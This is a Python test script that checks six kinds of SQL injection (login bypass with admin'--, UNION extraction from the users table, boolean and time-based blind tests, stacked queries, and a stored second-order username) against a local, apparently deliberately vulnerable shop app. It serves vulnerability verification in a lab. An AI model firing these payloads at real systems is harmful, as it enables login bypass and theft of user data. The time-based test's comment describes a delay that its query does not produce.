#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""SQL注入漏洞测试脚本"""

import requests
import time

BASE_URL = "http://127.0.0.1:9527"

def test_error_based_sqli():
    """测试基于错误的SQL注入 (POST /api/user/login)"""
    print("\n" + "="*60)
    print("测试1: Error-based SQL Injection (/api/user/login)")
    print("="*60)
    
    # 正常登录测试
    print("\n[1] 正常登录测试 (admin/admin123):")
    r = requests.post(f"{BASE_URL}/api/user/login", json={
        "username": "admin",
        "password": "admin123"
    })
    print(f"    响应: {r.json()}")
    
    # SQL注入绕过测试 - 使用 admin'--
    print("\n[2] SQL注入绕过测试 (username: admin'--):")
    r = requests.post(f"{BASE_URL}/api/user/login", json={
        "username": "admin'--",
        "password": "wrong_password"
    })
    result = r.json()
    print(f"    响应: {result}")
    
    if result.get('success'):
        print("    ✅ SQL注入成功！无需密码登录admin账户")
        return True
    
    # 尝试触发错误信息
    print("\n[3] 尝试触发SQL错误 (username: admin'):")
    r = requests.post(f"{BASE_URL}/api/user/login", json={
        "username": "admin'",
        "password": "x"
    })
    result = r.json()
    print(f"    响应: {result}")
    
    if 'error' in str(result).lower() or 'sql' in str(result).lower():
        print("    ✅ SQL错误信息泄露！")
        return True
    
    return False


def test_union_based_sqli():
    """测试联合查询SQL注入 (GET /api/user/profile)"""
    print("\n" + "="*60)
    print("测试2: Union-based SQL Injection (/api/user/profile)")
    print("="*60)
    
    # 正常查询
    print("\n[1] 正常查询用户ID=1:")
    r = requests.get(f"{BASE_URL}/api/user/profile?id=1")
    print(f"    响应: {r.json()}")
    
    # Union注入获取所有用户
    print("\n[2] UNION注入测试 (id=1 UNION SELECT ...):")
    r = requests.get(f"{BASE_URL}/api/user/profile?id=1 UNION SELECT 1,2,3,4,5,6 FROM users--")
    result = r.json()
    print(f"    响应: {result}")
    
    if result.get('success') and result.get('data'):
        data = result.get('data')
        if isinstance(data, list) and len(data) > 1:
            print("    ✅ UNION注入成功！获取了多行数据")
            return True
    
    # 简单注入测试
    print("\n[3] 简单OR注入测试 (id=1 OR 1=1):")
    r = requests.get(f"{BASE_URL}/api/user/profile?id=1 OR 1=1")
    result = r.json()
    print(f"    响应: {result}")
    
    if result.get('success') and result.get('data'):
        data = result.get('data')
        if isinstance(data, list) and len(data) > 1:
            print("    ✅ OR注入成功！获取了多行数据")
            return True
    
    return False


def test_boolean_blind_sqli():
    """测试布尔盲注 (GET /api/products/search)"""
    print("\n" + "="*60)
    print("测试3: Boolean-based Blind SQL Injection (/api/products/search)")
    print("="*60)
    
    # 正常搜索
    print("\n[1] 正常搜索:")
    r = requests.get(f"{BASE_URL}/api/products/search", params={"keyword": "iPhone"})
    result = r.json()
    normal_count = result.get('count', 0)
    print(f"    响应: count={normal_count}")
    
    # 布尔条件真 - 使用正确的闭合方式
    print("\n[2] 布尔真条件测试 (闭合法 AND 1=1):")
    r = requests.get(f"{BASE_URL}/api/products/search", params={"keyword": "iPhone%' AND 1=1 AND '%'='"})
    true_result = r.json()
    true_count = true_result.get('count', 0)
    print(f"    响应: count={true_count}")
    
    # 布尔条件假
    print("\n[3] 布尔假条件测试 (闭合法 AND 1=2):")
    r = requests.get(f"{BASE_URL}/api/products/search", params={"keyword": "iPhone%' AND 1=2 AND '%'='"})
    false_result = r.json()
    false_count = false_result.get('count', 0)
    print(f"    响应: count={false_count}")
    
    if true_count > 0 and false_count == 0:
        print("    ✅ 布尔盲注成功！条件不同结果不同")
        return True
    
    return False


def test_time_based_sqli():
    """测试时间盲注 (GET /api/products/detail)"""
    print("\n" + "="*60)
    print("测试4: Time-based Blind SQL Injection (/api/products/detail)")
    print("="*60)
    
    # 正常查询
    print("\n[1] 正常查询商品ID=1:")
    start = time.time()
    r = requests.get(f"{BASE_URL}/api/products/detail?id=1")
    normal_time = time.time() - start
    print(f"    响应时间: {normal_time:.3f}s")
    
    # SQLite时间延迟 - 使用randomblob
    print("\n[2] 时间延迟测试 (使用 CASE WHEN 构造):")
    # SQLite不支持SLEEP，使用randomblob造成延迟
    start = time.time()
    r = requests.get(f"{BASE_URL}/api/products/detail?id=1 AND 1=(SELECT CASE WHEN (1=1) THEN 1 ELSE 1 END)")
    inject_time = time.time() - start
    print(f"    响应时间: {inject_time:.3f}s")
    print(f"    响应: {r.json()}")
    
    # 尝试简单注入
    print("\n[3] 简单OR注入测试 (id=1 OR 1=1):")
    r = requests.get(f"{BASE_URL}/api/products/detail?id=1 OR 1=1")
    result = r.json()
    print(f"    响应: {result}")
    
    if result.get('success'):
        print("    ✅ 注入点存在！SQL可被拼接执行")
        return True
    
    return False


def test_stacked_queries_sqli():
    """测试堆叠查询注入 (GET /api/orders/query)"""
    print("\n" + "="*60)
    print("测试5: Stacked Queries SQL Injection (/api/orders/query)")
    print("="*60)
    
    # 正常查询
    print("\n[1] 正常查询订单:")
    r = requests.get(f"{BASE_URL}/api/orders/query?order_no=ORD20231201001")
    print(f"    响应: {r.json()}")
    
    # 堆叠查询测试
    print("\n[2] 堆叠查询测试 (order_no包含分号):")
    r = requests.get(f"{BASE_URL}/api/orders/query?order_no=ORD20231201001'; SELECT * FROM users;--")
    result = r.json()
    print(f"    响应: {result}")
    
    if result.get('success'):
        print("    ✅ 堆叠查询执行！SQL可能被多条执行")
        return True
    
    return False


def test_second_order_sqli():
    """测试二次注入 (POST /api/user/register)"""
    print("\n" + "="*60)
    print("测试6: Second-order SQL Injection (/api/user/register)")
    print("="*60)
    
    # 注册包含SQL注入的用户名
    print("\n[1] 注册包含SQL注入的用户名:")
    import random
    test_user = f"test{random.randint(1000,9999)}' OR '1'='1"
    r = requests.post(f"{BASE_URL}/api/user/register", json={
        "username": test_user,
        "password": "test123",
        "email": "test@test.com"
    })
    result = r.json()
    print(f"    用户名: {test_user}")
    print(f"    响应: {result}")
    
    if result.get('success'):
        print("    ✅ 恶意用户名已存储！可能触发二次注入")
        return True
    
    return False


def main():
    print("\n" + "="*60)
    print("       VulnShop SQL注入漏洞验证测试")
    print("="*60)
    
    results = {}
    
    try:
        results['Error-based'] = test_error_based_sqli()
    except Exception as e:
        print(f"测试失败: {e}")
        results['Error-based'] = False
    
    try:
        results['Union-based'] = test_union_based_sqli()
    except Exception as e:
        print(f"测试失败: {e}")
        results['Union-based'] = False
    
    try:
        results['Boolean-blind'] = test_boolean_blind_sqli()
    except Exception as e:
        print(f"测试失败: {e}")
        results['Boolean-blind'] = False
    
    try:
        results['Time-based'] = test_time_based_sqli()
    except Exception as e:
        print(f"测试失败: {e}")
        results['Time-based'] = False
    
    try:
        results['Stacked-queries'] = test_stacked_queries_sqli()
    except Exception as e:
        print(f"测试失败: {e}")
        results['Stacked-queries'] = False
    
    try:
        results['Second-order'] = test_second_order_sqli()
    except Exception as e:
        print(f"测试失败: {e}")
        results['Second-order'] = False
    
    # 输出汇总
    print("\n" + "="*60)
    print("                    测试结果汇总")
    print("="*60)
    
    for vuln_type, success in results.items():
        status = "✅ 存在漏洞" if success else "❌ 未检测到"
        print(f"    {vuln_type:20s}: {status}")
    
    passed = sum(1 for v in results.values() if v)
    total = len(results)
    print(f"\n    总计: {passed}/{total} 个漏洞点验证成功")
    print("="*60)


if __name__ == "__main__":
    main()
